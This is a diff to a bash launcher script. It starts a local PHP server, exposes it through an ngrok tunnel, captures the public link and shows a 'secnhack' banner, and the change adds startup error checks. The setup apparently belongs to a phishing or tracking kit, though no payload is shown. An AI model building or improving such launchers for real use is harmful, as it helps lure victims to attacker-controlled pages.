@@ -44,17 +44,38 @@ echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-                           sleep 3
+                                             php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                                             sleep 3
+                                             # Check if PHP server started
+                                             if pgrep -f "php -S 127.0.0.1:4444" > /dev/null; then
+                                                    echo -e "\e[1;32m[OK] PHP server started successfully.\e[0m"
+                                             else
+                                                    echo -e "\e[1;31m[ERROR] PHP server failed to start.\e[0m"
+                                                    exit 1
+                                             fi
                            echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 25
+                                             ./ngrok http 4444 > /dev/null 2>&1 &
+                                             sleep 5
+                                             # Check if ngrok started
+                                             if pgrep -f "ngrok http 4444" > /dev/null; then
+                                                    echo -e "\e[1;32m[OK] ngrok started successfully.\e[0m"
+                                             else
+                                                    echo -e "\e[1;31m[ERROR] ngrok failed to start.\e[0m"
+                                                    exit 1
+                                             fi
+                                             # Check if ngrok tunnel is available
+                                             link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                                             if [ -z "$link" ]; then
+                                                    echo -e "\e[1;31m[ERROR] ngrok tunnel not established.\e[0m"
+                                                    exit 1
+                                             fi
+                                             sleep 20
                            clear
                            echo ""
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                           # link already set above
                            echo ""
                            echo ""
                            cat secnhack
@@ -91,17 +112,38 @@ echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-                           sleep 3
+                                             php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                                             sleep 3
+                                             # Check if PHP server started
+                                             if pgrep -f "php -S 127.0.0.1:4444" > /dev/null; then
+                                                    echo -e "\e[1;32m[OK] PHP server started successfully.\e[0m"
+                                             else
+                                                    echo -e "\e[1;31m[ERROR] PHP server failed to start.\e[0m"
+                                                    exit 1
+                                             fi
                            echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 25
+                                             ./ngrok http 4444 > /dev/null 2>&1 &
+                                             sleep 5
+                                             # Check if ngrok started
+                                             if pgrep -f "ngrok http 4444" > /dev/null; then
+                                                    echo -e "\e[1;32m[OK] ngrok started successfully.\e[0m"
+                                             else
+                                                    echo -e "\e[1;31m[ERROR] ngrok failed to start.\e[0m"
+                                                    exit 1
+                                             fi
+                                             # Check if ngrok tunnel is available
+                                             link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                                             if [ -z "$link" ]; then
+                                                    echo -e "\e[1;31m[ERROR] ngrok tunnel not established.\e[0m"
+                                                    exit 1
+                                             fi
+                                             sleep 20
                            clear
                            echo ""
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+                           # link already set above
                            echo ""
                            echo ""
                            cat secnhack
